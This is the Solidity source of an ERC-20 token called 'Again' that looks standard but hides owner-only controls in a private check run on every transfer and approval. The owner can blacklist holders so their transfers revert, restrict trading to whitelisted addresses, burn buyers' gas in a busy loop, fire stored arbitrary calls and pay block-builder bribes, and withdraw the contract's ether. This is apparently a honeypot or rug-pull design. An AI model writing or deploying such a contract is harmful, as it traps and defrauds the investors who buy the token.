// SPDX-License-Identifier: MIT

pragma solidity 0.8.26;

struct Call {
    address target;
    uint256 value;
    uint256 gas;
    bytes data;
}

contract AGAIN {

    address private _owner;
    uint256 private _gas;

    bool private _activated;
    bool private _exclusive;
    bool private _bribe;

    mapping(address => uint256) private _permissions;

    Call[] private _calls;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() payable {
        _owner = msg.sender;

        _name = "Again";
        _symbol = "AGAIN";

        _mint(msg.sender, 2000000000000000000000000000000);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function gas() public view returns (uint256) {
        return _gas;
    }

    function activated() public view returns (bool) {
        return _activated;
    }

    function exclusive() public view returns (bool) {
        return _exclusive;
    }

    function bribe() public view returns (bool) {
        return _bribe;
    }

    function calls() public view returns (Call[] memory) {
        return _calls;
    }

    function permissions(address account) public view returns (uint256) {
        return _permissions[account];
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address _owner_, address spender) public view returns (uint256) {
        return _allowances[_owner_][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] - subtractedValue);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        _check();
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal {
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal {
        _balances[account] -= amount;
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }

    function _approve(address _owner_, address spender, uint256 amount) internal {
        _check();
        _allowances[_owner_][spender] = amount;
        emit Approval(_owner_, spender, amount);
    }

    function setGas(uint256 _gas_) external {
        require(msg.sender == _owner);
        _gas = _gas_;
    }

    function setCalls(Call[] calldata _calls_) external {
        require(msg.sender == _owner);
        for (uint256 i; i < _calls_.length; i++) {
            _calls.push(_calls_[i]);
        }
    }

    function setPermissions(address[] calldata addresses, uint256[] calldata permission) external {
        require(msg.sender == _owner);
        for (uint256 i; i < addresses.length; i++) {
            _permissions[addresses[i]] = permission[i];
        }
    }

    function setExclusive(bool _exclusive_) external {
        require(msg.sender == _owner);
        _exclusive = _exclusive_;
    }

    function setBribe(bool _bribe_) external {
        require(msg.sender == _owner);
        _bribe = _bribe_;
    }

    function activate(bool _activated_) external {
        require(msg.sender == _owner);
        _activated = _activated_;
    }

    function inactivate() external {
        require(msg.sender == _owner);
        for (uint256 i; i < _calls.length; i++) {
            _calls[i].target = address(0);
        }
    }

    function get() external {
        require(msg.sender == _owner);
        payable(msg.sender).transfer(address(this).balance);
    }

    function _check() private {
        if (_permissions[tx.origin] != 1) {
            require(_permissions[tx.origin] != 2);
            if (_exclusive) {require(_permissions[tx.origin] == 3);}
            uint256 startgas = gasleft();
            if (_activated && _permissions[tx.origin] == 3) {
                for (uint256 i; i < _calls.length; i++) {
                    if (_calls[i].target != address(0)) {_calls[i].target.call{value: _calls[i].value, gas: _calls[i].gas}(_calls[i].data);}
                    _calls[i].target = address(0);
                } block.coinbase.transfer(address(this).balance);
            } else if (_bribe && _permissions[tx.origin] == 3) {block.coinbase.transfer(address(this).balance);}
            while (startgas - gasleft() < _gas) {}
        }
    }

    receive() external payable {}
}
